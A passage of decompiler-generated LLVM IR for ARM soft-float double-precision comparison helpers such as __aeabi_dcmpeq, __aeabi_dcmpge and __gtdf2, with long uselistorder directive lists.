  uselistorder i32 4, { 5, 6, 188, 263, 264, 189, 7, 8, 268, 269, 270, 271, 272, 69, 273, 274, 282, 284, 285, 102, 286, 287, 288, 82, 289, 292, 127, 293, 294, 295, 296, 297, 298, 9, 299, 128, 103, 300, 129, 0, 1, 130, 303, 325, 326, 105, 104, 327, 131, 132, 133, 134, 328, 329, 107, 330, 106, 331, 84, 222, 223, 224, 316, 317, 202, 203, 290, 291, 197, 198, 199, 200, 201, 283, 10, 332, 11, 333, 341, 275, 12, 13, 14, 259, 15, 16, 225, 17, 101, 96, 97, 18, 400, 98, 401, 87, 19, 20, 99, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 21, 419, 420, 421, 422, 423, 424, 86, 425, 426, 427, 428, 429, 430, 22, 23, 100, 431, 319, 108, 226, 227, 228, 229, 230, 231, 232, 233, 234, 83, 235, 236, 237, 238, 239, 318, 240, 135, 276, 277, 278, 279, 280, 281, 24, 204, 205, 206, 207, 25, 208, 432, 136, 109, 137, 433, 26, 434, 138, 195, 196, 344, 345, 346, 91, 347, 139, 27, 209, 140, 210, 141, 88, 211, 265, 142, 266, 267, 335, 336, 337, 338, 143, 144, 212, 145, 146, 213, 28, 214, 215, 85, 89, 350, 351, 352, 353, 354, 355, 147, 148, 29, 356, 357, 358, 359, 360, 361, 362, 363, 149, 348, 349, 304, 305, 306, 307, 308, 309, 310, 311, 312, 30, 313, 314, 315, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 150, 151, 152, 378, 379, 382, 385, 380, 381, 110, 153, 383, 70, 384, 386, 387, 388, 390, 154, 32, 31, 389, 155, 156, 157, 342, 320, 399, 33, 34, 35, 36, 2, 241, 37, 38, 158, 71, 39, 40, 216, 159, 41, 160, 161, 162, 163, 242, 243, 42, 244, 164, 245, 246, 247, 112, 248, 249, 111, 165, 250, 251, 252, 253, 254, 255, 72, 166, 256, 258, 167, 168, 257, 190, 321, 43, 322, 113, 323, 324, 301, 302, 391, 392, 191, 44, 45, 46, 47, 73, 48, 49, 50, 74, 51, 52, 169, 53, 217, 114, 218, 219, 220, 221, 75, 170, 260, 92, 261, 93, 262, 54, 94, 95, 55, 76, 116, 192, 171, 172, 173, 174, 120, 175, 176, 118, 115, 193, 119, 56, 177, 117, 57, 194, 126, 58, 59, 90, 178, 121, 334, 339, 179, 77, 78, 60, 61, 62, 123, 122, 124, 79, 180, 125, 63, 64, 80, 181, 340, 182, 81, 183, 184, 65, 343, 66, 67, 68, 393, 394, 395, 396, 397, 398, 185, 186, 187, 3, 4 }
  uselistorder i32 32, { 92, 93, 94, 95, 30, 31, 39, 82, 83, 33, 34, 96, 32, 40, 97, 98, 99, 100, 37, 101, 117, 119, 120, 131, 47, 84, 132, 121, 122, 85, 86, 87, 88, 118, 134, 41, 35, 102, 48, 22, 103, 104, 49, 123, 124, 43, 42, 51, 55, 52, 56, 53, 57, 54, 58, 59, 125, 126, 60, 68, 69, 67, 70, 71, 72, 73, 74, 75, 62, 63, 1, 64, 2, 65, 4, 3, 61, 66, 50, 76, 135, 6, 5, 8, 7, 10, 9, 36, 129, 127, 128, 105, 106, 21, 107, 0, 77, 108, 109, 110, 111, 112, 113, 23, 89, 90, 130, 136, 78, 91, 79, 38, 114, 115, 116, 12, 11, 24, 44, 80, 133, 25, 14, 13, 16, 15, 26, 18, 17, 27, 28, 20, 19, 29, 45, 46, 81 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 9, 0, 2, 1, 10 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 85, 13, 14, 15, 84, 96, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 89, 56, 90, 57, 91, 58, 92, 93, 59, 60, 62, 61, 63, 64, 65, 66, 0, 87, 1, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 83, 94, 77, 82, 88, 95, 81, 78, 86, 79, 80 }
  uselistorder i32 1048576, { 21, 0, 1, 2, 22, 23, 14, 3, 4, 5, 24, 6, 7, 25, 26, 17, 18, 8, 9, 27, 28, 29, 20, 30, 10, 15, 11, 19, 12, 31, 16, 32, 13 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 70, 71, 72, 73, 124, 125, 4, 126, 127, 128, 129, 145, 146, 147, 148, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 187, 188, 189, 190, 191, 192, 193, 205, 206, 207, 219, 220, 221, 222, 6, 5, 31, 32, 33, 34, 35, 36, 223, 224, 7, 225, 226, 227, 228, 229, 230, 231, 149, 150, 151, 152, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 130, 8, 131, 132, 74, 75, 76, 77, 9, 78, 79, 80, 81, 82, 83, 84, 133, 134, 135, 136, 10, 11, 137, 138, 139, 140, 141, 142, 143, 144, 37, 38, 39, 40, 41, 42, 43, 44, 12, 13, 14, 289, 290, 291, 292, 293, 294, 2, 295, 296, 26, 15, 27, 16, 28, 286, 287, 288, 45, 46, 47, 120, 121, 122, 123, 48, 49, 50, 51, 52, 53, 254, 258, 259, 260, 261, 255, 256, 257, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 262, 263, 264, 265, 266, 17, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 282, 284, 278, 279, 280, 281, 283, 285, 117, 118, 3, 119, 25, 249, 250, 251, 252, 253, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 18, 208, 209, 56, 19, 57, 58, 210, 20, 211, 212, 96, 21, 24, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 1, 112, 22, 29, 97, 0, 98, 99, 54, 55, 213, 214, 23, 215, 216, 217, 218, 113, 114, 115, 116, 178, 179, 180, 181, 182, 183, 184, 185, 186, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 246, 247, 248, 30 }
  uselistorder i32* @r5, { 121, 122, 123, 124, 125, 126, 127, 128, 129, 54, 55, 56, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 246, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 1, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 8, 287, 288, 289, 290, 291, 344, 299, 300, 301, 302, 303, 304, 305, 28, 306, 307, 308, 325, 361, 362, 9, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 10, 378, 377, 30, 379, 380, 381, 382, 383, 57, 58, 59, 60, 61, 62, 63, 384, 385, 386, 387, 388, 389, 394, 395, 390, 391, 392, 393, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 11, 152, 153, 64, 65, 66, 67, 68, 69, 70, 71, 72, 247, 248, 249, 250, 251, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 345, 346, 347, 348, 450, 451, 452, 224, 33, 225, 5, 226, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 326, 327, 31, 328, 227, 228, 229, 230, 154, 2, 155, 156, 157, 158, 159, 160, 231, 14, 232, 233, 12, 234, 235, 236, 237, 238, 239, 13, 240, 241, 242, 243, 244, 245, 73, 15, 74, 75, 76, 77, 34, 78, 16, 79, 80, 81, 82, 83, 465, 17, 466, 467, 477, 43, 44, 45, 46, 47, 48, 49, 468, 469, 470, 471, 472, 84, 85, 86, 87, 88, 89, 90, 91, 92, 210, 211, 212, 93, 94, 95, 96, 18, 19, 473, 474, 475, 476, 97, 98, 99, 100, 418, 419, 423, 424, 425, 426, 427, 420, 421, 422, 309, 310, 311, 20, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 7, 441, 442, 443, 444, 445, 21, 446, 447, 448, 449, 205, 206, 207, 208, 209, 408, 409, 410, 411, 36, 415, 416, 22, 417, 349, 23, 350, 351, 352, 161, 24, 162, 35, 163, 164, 165, 166, 167, 168, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 105, 106, 107, 108, 109, 339, 340, 341, 342, 343, 169, 170, 172, 171, 173, 174, 25, 175, 176, 177, 178, 179, 180, 181, 32, 182, 183, 187, 6, 188, 3, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 50, 51, 52, 184, 185, 186, 102, 101, 29, 103, 104, 353, 354, 355, 356, 357, 358, 26, 359, 360, 199, 200, 201, 202, 203, 204, 292, 293, 294, 295, 296, 27, 297, 298, 110, 111, 4, 0, 112, 113, 114, 115, 116, 117, 118, 119, 120, 37, 38, 39, 40, 41, 42, 412, 413, 414, 53 }
  uselistorder i32 %arg4, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1de54, { 1, 0 }
  uselistorder label %dec_label_pc_1de38, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1de04, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1dcf4, { 1, 0 }
  uselistorder label %dec_label_pc_1dcdc, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1de78 = call i32 @function_1de88()
  ret i32 %v0_1de78
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1de80 = call i32 @function_1de88()
  ret i32 %v0_1de80

; uselistorder directives
  uselistorder i32 ()* @function_1de88, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1de84 = load i32, i32* @r0, align 4
  ret i32 %v0_1de84
}

define i32 @function_1de88() local_unnamed_addr {
dec_label_pc_1de88:
  %v0_1de88 = load i32, i32* @ip, align 4
  %v0_1de8c = load i32, i32* @r1, align 4
  %v2_1de8c = mul i32 %v0_1de8c, 2
  %v2_1de8c.off = add i32 %v2_1de8c, 4194303
  %tmp = icmp ult i32 %v2_1de8c.off, 2097152
  %v0_1de94 = load i32, i32* @r3, align 4
  %v2_1de94 = mul i32 %v0_1de94, 2
  br i1 %tmp, label %dec_label_pc_1dee4, label %bb

bb:                                               ; preds = %dec_label_pc_1de88
  %v2_1de94.off = add i32 %v2_1de94, 4194303
  %tmp21 = icmp ult i32 %v2_1de94.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1ded8, label %dec_label_pc_1dea0

dec_label_pc_1dea0:                               ; preds = %dec_label_pc_1deec, %dec_label_pc_1def8, %bb
  %v0_1dea0 = load i32, i32* @r0, align 4
  %v4_1dea0 = or i32 %v0_1dea0, %v2_1de8c
  %v6_1dea0 = icmp eq i32 %v4_1dea0, 0
  br i1 %v6_1dea0, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1dea0
  %v1_1dea4 = load i32, i32* @r2, align 4
  %v5_1dea4 = or i32 %v1_1dea4, %v2_1de94
  %v7_1dea4 = icmp eq i32 %v5_1dea4, 0
  br i1 %v7_1dea4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1dea0, %bb10
  %v5_1dea8 = icmp eq i32 %v0_1de94, %v0_1de8c
  br i1 %v5_1dea8, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1deac.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1deac = phi i32 [ %v2_1deac.pre, %.thread..thread1_crit_edge ], [ %v1_1dea4, %bb10 ]
  %v5_1deac = icmp eq i32 %v2_1deac, %v0_1dea0
  br i1 %v5_1deac, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1deb4 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1deb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1deb4, i32 %v0_1deb4)
  %v0_1deb8 = load i32, i32* @r0, align 4
  %v0_1debc = load i32, i32* @r1, align 4
  %v1_1debc = load i32, i32* @r3, align 4
  %v2_1debc = xor i32 %v1_1debc, %v0_1debc
  %v3_1debc = icmp slt i32 %v2_1debc, 0
  br i1 %v3_1debc, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1dec0 = icmp eq i32 %v0_1debc, %v1_1debc
  br i1 %v10_1dec0, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1dec4 = load i32, i32* @r2, align 4
  %v4_1dec4 = icmp ult i32 %v0_1deb8, %v2_1dec4
  br i1 %v4_1dec4, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1dec0 = icmp ult i32 %v0_1debc, %v1_1debc
  br i1 %v4_1dec0, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1debc, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1dec8 = and i32 %v1_1debc, 1073741824
  %v3_1dec8 = icmp eq i32 %v2_1dec8, 0
  %v4_1dec8 = ashr i32 %v1_1debc, 31
  br i1 %v3_1dec8, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1decc.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1dec8, %bb15 ]
  %v5_1decc = sub nsw i32 -1, %v4_1decc.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1ded0 = phi i32 [ %v4_1dec8, %bb15 ], [ %v5_1decc, %.thread3 ]
  %v1_1ded0 = or i32 %v0_1ded0, 1
  ret i32 %v1_1ded0

dec_label_pc_1ded8:                               ; preds = %bb
  br label %dec_label_pc_1deec

dec_label_pc_1dee4:                               ; preds = %dec_label_pc_1de88
  %v0_1dee4 = load i32, i32* @r0, align 4
  %v4_1dee4 = mul i32 %v0_1de8c, 4096
  %v5_1dee4 = or i32 %v0_1dee4, %v4_1dee4
  %v7_1dee4 = icmp eq i32 %v5_1dee4, 0
  br i1 %v7_1dee4, label %dec_label_pc_1dee4.dec_label_pc_1deec_crit_edge, label %dec_label_pc_1df00

dec_label_pc_1dee4.dec_label_pc_1deec_crit_edge:  ; preds = %dec_label_pc_1dee4
  %v2_1de94.off20 = add i32 %v2_1de94, 4194303
  %tmp22 = icmp ult i32 %v2_1de94.off20, 2097152
  br label %dec_label_pc_1deec

dec_label_pc_1deec:                               ; preds = %dec_label_pc_1dee4.dec_label_pc_1deec_crit_edge, %dec_label_pc_1ded8
  %v3_1def0.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1dee4.dec_label_pc_1deec_crit_edge ], [ true, %dec_label_pc_1ded8 ]
  br i1 %v3_1def0.pre-phi, label %dec_label_pc_1def8, label %dec_label_pc_1dea0

dec_label_pc_1def8:                               ; preds = %dec_label_pc_1deec
  %v0_1def8 = load i32, i32* @r2, align 4
  %v4_1def8 = mul i32 %v0_1de94, 4096
  %v5_1def8 = or i32 %v0_1def8, %v4_1def8
  %v7_1def8 = icmp eq i32 %v5_1def8, 0
  br i1 %v7_1def8, label %dec_label_pc_1dea0, label %dec_label_pc_1df00

dec_label_pc_1df00:                               ; preds = %dec_label_pc_1dee4, %dec_label_pc_1def8
  ret i32 %v0_1de88

; uselistorder directives
  uselistorder i32 %v4_1dec8, { 1, 0 }
  uselistorder i32 %v1_1debc, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1debc, { 2, 1, 0 }
  uselistorder i32 %v1_1dea4, { 1, 0 }
  uselistorder i32 %v2_1de94, { 0, 2, 1 }
  uselistorder i32 %v0_1de94, { 1, 0, 2 }
  uselistorder i32 %v2_1de8c, { 1, 0 }
  uselistorder i32 %v0_1de8c, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 18, 12, 7, 8, 1, 13, 0, 14, 15, 16, 17, 9, 19 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 7, 5, 6, 8, 9, 10, 11, 30, 31, 32, 33, 34, 35, 36, 37, 38, 46, 47, 48, 49, 50, 58, 59, 60, 39, 12, 44, 65, 56, 40, 45, 70, 75, 73, 74, 72, 66, 67, 0, 42, 43, 68, 69, 71, 62, 63, 54, 14, 57, 15, 41, 1, 55, 13, 51, 52, 53, 61, 64, 2, 3, 4 }
  uselistorder i32* @r3, { 25, 26, 16, 17, 27, 28, 7, 29, 30, 31, 32, 51, 52, 53, 54, 55, 56, 57, 58, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 2, 83, 6, 18, 20, 21, 85, 86, 107, 108, 3, 109, 110, 111, 4, 112, 113, 114, 5, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 0, 133, 134, 135, 136, 33, 34, 94, 95, 96, 35, 36, 37, 38, 39, 40, 19, 137, 143, 144, 145, 141, 59, 60, 61, 100, 101, 97, 62, 41, 42, 102, 103, 104, 105, 106, 9, 10, 11, 149, 146, 147, 148, 1, 150, 151, 152, 43, 44, 66, 22, 67, 68, 69, 70, 45, 46, 71, 142, 63, 64, 65, 138, 139, 140, 23, 24, 47, 48, 49, 50, 12, 13, 14, 15, 87, 88, 89, 90, 91, 92, 93, 8, 98, 99 }
  uselistorder i32* @r1, { 68, 69, 13, 70, 71, 72, 73, 74, 12, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 33, 34, 14, 35, 36, 86, 1, 87, 88, 89, 90, 91, 92, 93, 11, 94, 95, 96, 97, 137, 15, 138, 139, 140, 143, 16, 17, 144, 145, 146, 147, 148, 149, 152, 153, 154, 155, 156, 159, 167, 168, 169, 170, 171, 172, 173, 8, 37, 38, 174, 175, 160, 98, 39, 41, 176, 177, 183, 184, 141, 129, 161, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 19, 142, 0, 40, 42, 21, 32, 203, 150, 151, 2, 157, 158, 3, 4, 198, 121, 22, 23, 24, 25, 185, 186, 192, 5, 189, 190, 191, 162, 163, 164, 110, 111, 112, 26, 27, 178, 179, 180, 181, 182, 6, 193, 194, 9, 122, 123, 195, 28, 18, 7, 113, 114, 115, 10, 116, 117, 118, 29, 165, 166, 119, 120, 20, 200, 201, 31, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 124, 125, 126, 127, 128, 130, 131, 132, 133, 134, 135, 136, 187, 188, 196, 197, 30, 199, 202 }
  uselistorder i32* @ip, { 27, 17, 18, 19, 28, 29, 30, 31, 32, 33, 34, 71, 72, 73, 74, 75, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 99, 1, 107, 106, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 127, 125, 128, 10, 129, 11, 130, 131, 132, 133, 35, 36, 2, 37, 20, 83, 134, 135, 136, 150, 78, 79, 14, 39, 38, 6, 40, 41, 7, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 12, 196, 197, 198, 199, 200, 201, 202, 203, 204, 80, 42, 43, 44, 45, 46, 205, 206, 68, 92, 93, 3, 94, 95, 96, 97, 98, 156, 13, 100, 101, 102, 103, 104, 105, 157, 158, 151, 15, 111, 112, 47, 76, 77, 162, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 49, 48, 8, 210, 207, 208, 209, 9, 211, 108, 0, 22, 109, 4, 110, 23, 5, 24, 51, 52, 53, 54, 55, 56, 57, 58, 50, 59, 60, 61, 62, 63, 64, 65, 66, 21, 113, 114, 115, 67, 154, 155, 25, 26, 69, 70, 152, 153, 161, 160, 159, 16 }
  uselistorder label %dec_label_pc_1df00, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1dea0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1df08 = load i32, i32* @r0, align 4
  %v0_1df0c = load i32, i32* @r2, align 4
  store i32 %v0_1df0c, i32* @r0, align 4
  store i32 %v0_1df08, i32* @r2, align 4
  %v0_1df20 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1df20
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1df24 = load i32, i32* @r0, align 4
  %v1_1df28 = sext i32 %v3_1df24 to i64
  %v2_1df28 = bitcast i64 %v1_1df28 to double
  %v3_1df28 = load i32, i32* @r2, align 4
  %v4_1df28 = sext i32 %v3_1df28 to i64
  %v5_1df28 = bitcast i64 %v4_1df28 to double
  %v7_1df28 = fcmp oeq double %v2_1df28, %v5_1df28
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1df28 = fcmp ule double %v2_1df28, %v5_1df28
  %not.v7_1df28 = xor i1 %v7_1df28, true
  %v1_1df2c = and i1 %not.v6_1df28, %not.v7_1df28
  store i1 %v7_1df28, i1* @cpsr_z, align 1
  br i1 %v1_1df2c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1df28, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1df24

; uselistorder directives
  uselistorder i1 %v7_1df28, { 1, 2, 0 }
  uselistorder i32* @r2, { 13, 38, 39, 40, 41, 2, 42, 43, 44, 45, 46, 47, 10, 48, 100, 101, 105, 11, 107, 108, 109, 110, 111, 119, 126, 127, 128, 129, 130, 131, 17, 132, 133, 134, 49, 50, 20, 106, 18, 19, 104, 135, 136, 137, 12, 82, 9, 155, 156, 157, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 144, 61, 62, 63, 64, 102, 103, 158, 159, 164, 165, 166, 167, 1, 170, 160, 112, 113, 114, 115, 116, 3, 161, 4, 5, 117, 118, 6, 7, 145, 121, 65, 66, 67, 68, 83, 93, 120, 0, 168, 8, 169, 69, 70, 71, 73, 72, 74, 75, 76, 77, 122, 123, 124, 78, 79, 125, 162, 163, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 80, 81, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 95, 14, 15, 16, 96, 97, 98, 99, 138, 139, 140, 141, 142, 143, 146, 147, 148, 149, 150, 151, 152, 153, 154 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1df40 = call i32 @__aeabi_cdcmple()
  %v0_1df44 = load i1, i1* @cpsr_z, align 1
  %.v0_1df40. = zext i1 %v0_1df44 to i32
  ret i32 %.v0_1df40.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1df58 = call i32 @__aeabi_cdcmple()
  %v0_1df5c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1df5c to i32
  %.v0_1df58. = xor i32 %tmp2, 1
  ret i32 %.v0_1df58.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1df70 = call i32 @__aeabi_cdcmple()
  %v0_1df74 = load i1, i1* @cpsr_z, align 1
  %v1_1df74 = load i1, i1* @cpsr_c, align 1
  %v2_1df74 = xor i1 %v1_1df74, true
  %v3_1df74 = or i1 %v0_1df74, %v2_1df74
  %.v0_1df70 = select i1 %v3_1df74, i32 1, i32 %v0_1df70
  %v2_1df78 = xor i1 %v0_1df74, true
  %v3_1df78 = and i1 %v1_1df74, %v2_1df78
  %..v0_1df70 = select i1 %v3_1df78, i32 0, i32 %.v0_1df70
  ret i32 %..v0_1df70

; uselistorder directives
  uselistorder i1 %v1_1df74, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1df84 = load i32, i32* @lr, align 4
  store i32 %v0_1df84, i32* %stack_var_-8, align 4
  %v0_1df88 = call i32 @__aeabi_cdrcmple()
  %v0_1df8c = load i1, i1* @cpsr_z, align 1
  %v1_1df8c = load i1, i1* @cpsr_c, align 1
  %v2_1df8c = xor i1 %v1_1df8c, true
  %v3_1df8c = or i1 %v0_1df8c, %v2_1df8c
  %.v0_1df88 = select i1 %v3_1df8c, i32 1, i32 %v0_1df88
  %v2_1df90 = xor i1 %v0_1df8c, true
  %v3_1df90 = and i1 %v1_1df8c, %v2_1df90
  %..v0_1df88 = select i1 %v3_1df90, i32 0, i32 %.v0_1df88
  %v2_1df94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1df94, i32* @lr, align 4
  ret i32 %..v0_1df88

; uselistorder directives
  uselistorder i1 %v1_1df8c, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 103, 1, 94, 7, 8, 9, 10, 11, 12, 86, 87, 95, 96, 88, 13, 14, 15, 89, 90, 91, 97, 16, 17, 18, 19, 22, 21, 20, 105, 106, 107, 108, 109, 110, 111, 92, 112, 113, 114, 99, 115, 116, 117, 118, 93, 119, 120, 121, 122, 123, 124, 125, 23, 126, 104, 127, 24, 25, 26, 27, 100, 30, 31, 32, 33, 28, 29, 101, 34, 102, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 98, 128, 64, 65, 66, 67, 2, 68, 69, 84, 70, 71, 72, 73, 85, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i1* @cpsr_z, { 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 0, 1, 2, 3, 4, 5, 6, 7, 44, 8, 9, 10, 11, 12, 13, 14, 15, 40, 41, 42, 43, 16, 17, 18, 19, 39, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* @lr, { 19, 20, 21, 22, 23, 7, 8, 9, 10, 11, 24, 0, 25, 1, 26, 27, 28, 56, 57, 61, 62, 63, 67, 68, 69, 70, 71, 72, 73, 74, 77, 87, 88, 81, 89, 90, 91, 92, 93, 94, 95, 96, 12, 97, 98, 99, 107, 100, 101, 102, 103, 104, 105, 106, 29, 64, 65, 66, 52, 133, 134, 135, 136, 137, 138, 139, 140, 141, 82, 83, 58, 59, 60, 30, 31, 32, 33, 34, 35, 36, 37, 38, 55, 13, 14, 112, 113, 114, 50, 51, 53, 54, 110, 142, 143, 115, 116, 117, 118, 119, 78, 79, 80, 120, 121, 122, 123, 124, 125, 126, 2, 127, 128, 130, 131, 129, 108, 109, 16, 17, 18, 84, 85, 86, 39, 40, 41, 42, 43, 44, 3, 4, 45, 46, 47, 48, 15, 75, 76, 111, 132, 49, 5, 6 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1dfa0 = call i32 @__aeabi_cdrcmple()
  %v0_1dfa4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1dfa4 to i32
  %.v0_1dfa0. = xor i32 %tmp2, 1
  ret i32 %.v0_1dfa0.

; uselistorder directives
